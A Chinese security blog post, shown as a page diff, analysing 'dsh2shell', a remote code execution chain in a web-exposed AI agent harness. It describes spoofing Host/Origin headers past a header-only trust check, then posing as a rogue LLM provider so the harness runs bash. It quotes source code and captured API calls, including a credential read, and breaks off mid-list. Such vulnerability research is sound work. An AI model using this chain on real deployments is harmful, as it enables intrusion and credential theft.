@@ -1,0 +1,962 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="dsh2shell 起因是突发奇想，有没有什么AI产品是不集成在其他服务中能被独立攻击到的呢? 然后就发现Deepseek harness 在最开始是Web UI，那么也就有从公网上被攻击的风险(不是到底是谁在部署到公网…)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dsh2shell研究">
+<meta property="og:url" content="https://ayan0.top/2026/11/02/dsh2shell%E7%A0%94%E7%A9%B6/">
+<meta property="og:site_name" content="Blog of AyaN0">
+<meta property="og:description" content="dsh2shell 起因是突发奇想，有没有什么AI产品是不集成在其他服务中能被独立攻击到的呢? 然后就发现Deepseek harness 在最开始是Web UI，那么也就有从公网上被攻击的风险(不是到底是谁在部署到公网…)">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026144729769.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026160116850.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026161246983.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030190228874.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030190422319.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030192837568.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030230334167.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102221039564.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102221543495.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102230221431.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026144020956.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026144123880.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261102232347378.png">
+<meta property="article:published_time" content="2026-11-02T15:16:31.000Z">
+<meta property="article:modified_time" content="2026-11-02T15:24:51.908Z">
+<meta property="article:author" content="AyaN0">
+<meta property="article:tag" content="AI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026144729769.png">
+
+
+<link rel="canonical" href="https://ayan0.top/2026/11/02/dsh2shell%E7%A0%94%E7%A9%B6/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2026/11/02/dsh2shell%E7%A0%94%E7%A9%B6/","path":"2026/11/02/dsh2shell研究/","title":"dsh2shell研究"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>dsh2shell研究 | Blog of AyaN0</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog of AyaN0</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dsh2shell"><span class="nav-number">1.</span> <span class="nav-text"> dsh2shell</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#tldr"><span class="nav-number">1.1.</span> <span class="nav-text"> TL;DR</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#how-dsh2shell-rce"><span class="nav-number">1.2.</span> <span class="nav-text"> How dsh2shell RCE?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#fake-loopback"><span class="nav-number">1.2.1.</span> <span class="nav-text"> fake loopback</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dsh-web-interact-with-user-via-http"><span class="nav-number">1.3.</span> <span class="nav-text"> dsh-web interact with user via HTTP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">1.3.1.</span> <span class="nav-text"> 初始化</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rogue2"><span class="nav-number">1.4.</span> <span class="nav-text"> rogue*2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#rogue-llm-provider"><span class="nav-number">1.4.1.</span> <span class="nav-text"> rogue LLM Provider</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#evil-llm"><span class="nav-number">1.4.2.</span> <span class="nav-text"> evil LLM</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A2%8E%E7%A2%8E%E5%BF%B5"><span class="nav-number">1.5.</span> <span class="nav-text"> 碎碎念</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2026/11/02/dsh2shell%E7%A0%94%E7%A9%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="dsh2shell研究 | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          dsh2shell研究
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-11-02 23:16:31 / 修改时间：23:24:51" itemprop="dateCreated datePublished" datetime="2026-11-02T23:16:31+08:00">2026-11-02</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>29k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>52 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="dsh2shell"><a class="markdownIt-Anchor" href="#dsh2shell"></a> dsh2shell</h1>
+<p>起因是突发奇想，有没有什么AI产品是不集成在其他服务中能被独立攻击到的呢?</p>
+<p>然后就发现Deepseek harness 在最开始是Web UI，那么也就有从公网上被攻击的风险(不是到底是谁在部署到公网…)</p>
+<p>再信息收集下发现有个dsh2shell的漏洞，但是看了眼poc写的有点一言难尽吧，AI slop出来的也不好自己patch，所以打算研究原理自己重新写一版</p>
+<h2 id="tldr"><a class="markdownIt-Anchor" href="#tldr"></a> TL;DR</h2>
+<p>这个洞通过伪造Host过信任校验，接着再在dsh上注册一个恶意的LLM，创建full-access会话，并通过它去调用Harness的原生tools来执行命令</p>
+<h2 id="how-dsh2shell-rce"><a class="markdownIt-Anchor" href="#how-dsh2shell-rce"></a> How dsh2shell RCE?</h2>
+<p>首先回归源码</p>
+<h3 id="fake-loopback"><a class="markdownIt-Anchor" href="#fake-loopback"></a> fake loopback</h3>
+<p>先看到最外层的检验<code>deepseek-harness-dsh-v0.1.1-rc.2\packages\client\connection\src\api-request-trust.ts</code></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026144729769.png" alt="image-20261026144729769"></p>
+<p>可以看到这里有两个变量完全由用户控制</p>
+<p><code>host</code>和<code>origin</code>(分别取自Request的Host头和Origin头)</p>
+<p>接着会对host进行解析，检查hostname是否为回环地址，hostUrl是否在受信任的域名下，任意满意其中一个条件就短路</p>
+<p>再进行<code>sec-fetch-site</code>值的校验，只能为<code>cross-site</code></p>
+<p>最后检验Origin的host是否和host一致</p>
+<p>只检查报文不检查连接IP吗，那只能畅通无阻了</p>
+<p><strong>但是看注释也会发现</strong>，这里本来就只是用来防御来自浏览器层的攻击的，不是认证层。本来设计出来就是让你 webserver 只绑回环地址的</p>
+<p>过了<code>isTrustedApiRequest</code>看看 能应用在哪里</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026160116850.png" alt="image-20261026160116850"></p>
+<p>发现能够直接访问API了</p>
+<p>甚至这里直接用这个函数给<code>PRIVILEGED_METHODS</code>做鉴权</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026161246983.png" alt="image-20261026161246983"></p>
+<pre><code class="highlight ts"><span class="keyword">const</span> <span class="variable constant_">PRIVILEGED_METHODS</span> = <span class="keyword">new</span> <span class="title class_">Set</span>([
+  <span class="comment">// A preset composition names the plugins a session runs, so reading one is</span>
+  <span class="comment">// reconnaissance; copy and remove rearrange what the deployment offers, and</span>
+  <span class="comment">// openDocument drives the host desktop — all more than the roster beside</span>
+  <span class="comment">// them. (Authoring is copy-only, so no method here accepts composition text</span>
+  <span class="comment">// or a path; the pin is about who may manage the roster at all.)</span>
+  <span class="comment">//</span>
+  <span class="comment">// CHOOSING one is not pinned, and `agentPreset.list` is not either. Picking a</span>
+  <span class="comment">// preset looks like escalation — one of them mounts the toolset that edits the</span>
+  <span class="comment">// live runtime — but `session.create` already takes an `agentPreset`, so</span>
+  <span class="comment">// pinning only the switch would leave the same capability one method over.</span>
+  <span class="comment">// The deeper reason is that the capability is not the preset&#x27;s to grant: the</span>
+  <span class="comment">// deployment&#x27;s own default already carries `bash` and the filesystem tools, so</span>
+  <span class="comment">// any caller that may start a session at all can already run commands as this</span>
+  <span class="comment">// process. Pinning the switch would be a fence beside an open gate.</span>
+  <span class="string">&#x27;agentPreset.read&#x27;</span>,
+  <span class="string">&#x27;agentPreset.copy&#x27;</span>,
+  <span class="string">&#x27;agentPreset.openDocument&#x27;</span>,
+  <span class="string">&#x27;agentPreset.remove&#x27;</span>,
+  <span class="string">&#x27;host.pickDirectory&#x27;</span>,
+  <span class="string">&#x27;host.openPath&#x27;</span>,
+  <span class="string">&#x27;settings.describe&#x27;</span>,
+  <span class="string">&#x27;settings.openDocument&#x27;</span>,
+  <span class="string">&#x27;settings.update&#x27;</span>,
+  <span class="string">&#x27;settings.replace&#x27;</span>,
+  <span class="string">&#x27;settings.mutate&#x27;</span>,
+  <span class="string">&#x27;credentials.describe&#x27;</span>,
+  <span class="string">&#x27;credentials.set&#x27;</span>,
+  <span class="string">&#x27;credentials.unset&#x27;</span>,
+  <span class="string">&#x27;llm.discoverModels&#x27;</span>,
+])</code></pre>
+<p>我们再看这些method对应的业务(代码里实在看不出来。。。直接用ai收集信息了)</p>
+<pre><code class="highlight plaintext">• 设置管理： settings.describe, settings.update, settings.replace, settings.mutate, settings.openDocument
+• 凭证秘钥： credentials.describe, credentials.set, credentials.unset
+• 大模型嗅探： llm.discoverModels
+• 智能体预设： agentPreset.read, agentPreset.copy, agentPreset.openDocument, agentPreset.remove
+• 主机敏感文件操作： host.pickDirectory, host.openPath</code></pre>
+<p>发现过了权限其实就随便搞了(特权路由都有了还怕不能调用普通路由吗)，到这里其实就算直接接管dsh本体了</p>
+<p>接着诱导Harness调用原生的bash工具就行，可能有人会疑问，为什么是Harness去调用bash工具呢?不是AI去调用吗</p>
+<p>这里简单的讲点题外话吧，AI Agent其实是LLM+Harness+一些其他的东西(具体的我忘记了，可以将其看做一台电脑，LLM就是CPU，负责核心的工作(计算推理)，而Harness则是操作系统，负责嵌合用户与LLM之间的交互，同时也执行LLM传递的指令，保证其执行环境</p>
+<p>那么其实也不难看出，当我们通过外层的限制接管AI Agent时，其实有时候不需要对LLM进行污染/注入，反而只要突破Harness层，假装成内部的LLM诱导Harness去执行就可以直接进行高危操作了</p>
+<h2 id="dsh-web-interact-with-user-via-http"><a class="markdownIt-Anchor" href="#dsh-web-interact-with-user-via-http"></a> dsh-web interact with user via HTTP</h2>
+<p>那么返回正题，我们要如何判断哪些操作可以摸到Harness的执行层呢?</p>
+<p>我们用docker开一个dsh的webui尝试抓包看看传递指令是不是通过HTTP/HTTPS协议进行的</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030190228874.png" alt="image-20261030190228874"></p>
+<p>发现是可以抓到包的</p>
+<p>我们筛选掉拉取plugin的请求，只看执行method的</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030190422319.png" alt="image-20261030190422319"></p>
+<h3 id="初始化"><a class="markdownIt-Anchor" href="#初始化"></a> 初始化</h3>
+<p>dsh获取用户会话的手段是在一开始通过websocket建立连接分发一个rpcId，后面接一个events.mux的method</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261030192837568.png" alt="image-20261030192837568"></p>
+<pre><code class="highlight json"><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;server-request&quot;</span><span class="punctuation">,</span><span class="attr">&quot;rpcId&quot;</span><span class="punctuation">:</span><span class="string">&quot;7db1f8ac-90e1-42d0-962c-ef6a8d6519c1&quot;</span><span class="punctuation">,</span><span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;host/remote-event&quot;</span><span class="punctuation">,</span><span class="attr">&quot;payload&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;host/remote-event&quot;</span><span class="punctuation">,</span><span class="attr">&quot;event&quot;</span><span class="punctuation">:</span><span class="string">&quot;settings/document-updated&quot;</span><span class="punctuation">,</span><span class="attr">&quot;args&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;ui-onboarding&quot;</span><span class="punctuation">,</span><span class="number">1</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></code></pre>
+<p>不太清楚这里在干什么(</p>
+<p>接着继续看，都是POST方法</p>
+<pre><code class="highlight plaintext">#1
+/api/host.describe
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;00534ee8-2cac-4f8b-86d1-95eef0d670c7&quot;,&quot;method&quot;:&quot;host.describe&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#2
+/api/settings.describe
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;52066fef-d9b8-4c04-918a-d646b3bd0f38&quot;,&quot;method&quot;:&quot;settings.describe&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#3
+/api/session.list
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;b257eab6-7eff-4789-aad0-0ad8071bc5b4&quot;,&quot;method&quot;:&quot;session.list&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#4
+/api/workspace.list
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;5a6cfd3a-478e-45e0-8ecd-890f05efa120&quot;,&quot;method&quot;:&quot;workspace.list&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#5
+/api/dynamicCordisRunner
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;7f8e780a-5738-4c19-a785-d4ab54722453&quot;,&quot;method&quot;:&quot;dynamicCordisRunner/syncInspectManifest&quot;,&quot;payload&quot;:&#123;&quot;args&quot;:&#123;&quot;providers&quot;:[&#123;&quot;id&quot;:&quot;Service&quot;,&quot;description&quot;:&quot;Progressive Client Service discovery: compact capability/signature directory, then one exact coding contract.&quot;,&quot;methods&quot;:[&#123;&quot;name&quot;:&quot;listService&quot;,&quot;description&quot;:&quot;Progressive Client Service discovery: compact capability/signature directory, then one exact coding contract.&quot;,&quot;inputSchema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;service&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;description&quot;:&quot;Exact Service key. Omit it for the compact Service and method-signature directory.&quot;&#125;&#125;,&quot;additionalProperties&quot;:false&#125;,&quot;outputSchema&quot;:&#123;&quot;description&quot;:&quot;Compact Service directory, or one exact Service contract with only its referenced type declarations.&quot;&#125;&#125;]&#125;,&#123;&quot;id&quot;:&quot;Event&quot;,&quot;description&quot;:&quot;Progressive Client Event discovery: compact listener directory, then one exact event contract.&quot;,&quot;methods&quot;:[&#123;&quot;name&quot;:&quot;listEvents&quot;,&quot;description&quot;:&quot;Progressive Client Event discovery: compact listener directory, then one exact event contract.&quot;,&quot;inputSchema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;event&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;description&quot;:&quot;Exact Event name. Omit it for the compact Event and listener-signature directory.&quot;&#125;&#125;,&quot;additionalProperties&quot;:false&#125;,&quot;outputSchema&quot;:&#123;&quot;description&quot;:&quot;Compact Event directory, or one exact Event contract with only its referenced type declarations.&quot;&#125;&#125;]&#125;,&#123;&quot;id&quot;:&quot;Builtin&quot;,&quot;description&quot;:&quot;Plain-JavaScript symbols available to a dynamic Client half.&quot;,&quot;methods&quot;:[&#123;&quot;name&quot;:&quot;listBuiltins&quot;,&quot;description&quot;:&quot;Plain-JavaScript symbols available to a dynamic Client half.&quot;,&quot;inputSchema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&#125;,&quot;additionalProperties&quot;:false&#125;,&quot;outputSchema&quot;:&#123;&quot;description&quot;:&quot;JSON data owned by this inspect provider.&quot;&#125;&#125;]&#125;,&#123;&quot;id&quot;:&quot;Slots&quot;,&quot;description&quot;:&quot;Progressive live Slot inspection: compact purpose/topology trees plus one exact Slot contract.&quot;,&quot;methods&quot;:[&#123;&quot;name&quot;:&quot;listSubTree&quot;,&quot;description&quot;:&quot;Return compact live Slot trees for navigation. With root, also return the selected Slot&#x27;s full contract and occupants.&quot;,&quot;inputSchema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&quot;root&quot;:&#123;&quot;type&quot;:&quot;string&quot;,&quot;description&quot;:&quot;Exact live Slot key. When supplied, selected contains the full contract for this Slot.&quot;&#125;&#125;,&quot;additionalProperties&quot;:false&#125;,&quot;outputSchema&quot;:&#123;&quot;description&quot;:&quot;Compact purpose/topology trees. With root, selected also contains that Slot&#x27;s full contract and live occupants.&quot;&#125;&#125;]&#125;,&#123;&quot;id&quot;:&quot;Theme&quot;,&quot;description&quot;:&quot;Current theme token names and light/dark override requirements.&quot;,&quot;methods&quot;:[&#123;&quot;name&quot;:&quot;listTokens&quot;,&quot;description&quot;:&quot;Current theme token names and light/dark override requirements.&quot;,&quot;inputSchema&quot;:&#123;&quot;type&quot;:&quot;object&quot;,&quot;properties&quot;:&#123;&#125;,&quot;additionalProperties&quot;:false&#125;,&quot;outputSchema&quot;:&#123;&quot;description&quot;:&quot;JSON data owned by this inspect provider.&quot;&#125;&#125;]&#125;]&#125;&#125;&#125;
+
+#6
+/api/settings.describe
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;746ddb06-2966-4aa0-9260-14d602550b3e&quot;,&quot;method&quot;:&quot;settings.describe&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#7
+/api/dynamicCordisRunner/inventory
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;2f1edb0d-8631-4214-8e2c-d62a0e668225&quot;,&quot;method&quot;:&quot;dynamicCordisRunner/inventory&quot;,&quot;payload&quot;:&#123;&quot;args&quot;:&#123;&#125;&#125;&#125;
+
+#8
+/api/credentials.describe
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;bc3e5e15-18c1-42dc-91ad-3b6968cfa592&quot;,&quot;method&quot;:&quot;credentials.describe&quot;,&quot;payload&quot;:&#123;&quot;refs&quot;:[&quot;DEEPSEEK_API_KEY&quot;]&#125;&#125;
+
+#9
+/api/dynamicCordisRunner/inventory
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;accdca84-9af5-4f18-aaf7-76eee77e624c&quot;,&quot;method&quot;:&quot;dynamicCordisRunner/inventory&quot;,&quot;payload&quot;:&#123;&quot;args&quot;:&#123;&#125;&#125;&#125;
+
+#10
+/api/agentPreset.list
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;e1bf50bc-7bf8-4f0c-ace3-6f9fd55aec4c&quot;,&quot;method&quot;:&quot;agentPreset.list&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#11
+/api/settings.mutate
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;122b6b59-eccc-47bd-87ea-b4dc9a93cce8&quot;,&quot;method&quot;:&quot;settings.mutate&quot;,&quot;payload&quot;:&#123;&quot;ns&quot;:&quot;ui-onboarding&quot;,&quot;ops&quot;:[&#123;&quot;op&quot;:&quot;set&quot;,&quot;path&quot;:[&quot;welcomeNoticeVersion&quot;],&quot;value&quot;:&quot;2026-08-13.1&quot;&#125;],&quot;expectedRevision&quot;:0&#125;&#125;
+
+#12
+/api/settings.describe
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;417129e8-8310-4d7b-adb6-769709ce5bcb&quot;,&quot;method&quot;:&quot;settings.describe&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#13
+/api/llm.providers
+&#123;&quot;type&quot;:&quot;client-request&quot;,&quot;rpcId&quot;:&quot;22440dbe-52b3-4e14-bc69-5dfef1dbd404&quot;,&quot;method&quot;:&quot;llm.providers&quot;,&quot;payload&quot;:&#123;&#125;&#125;
+
+#14
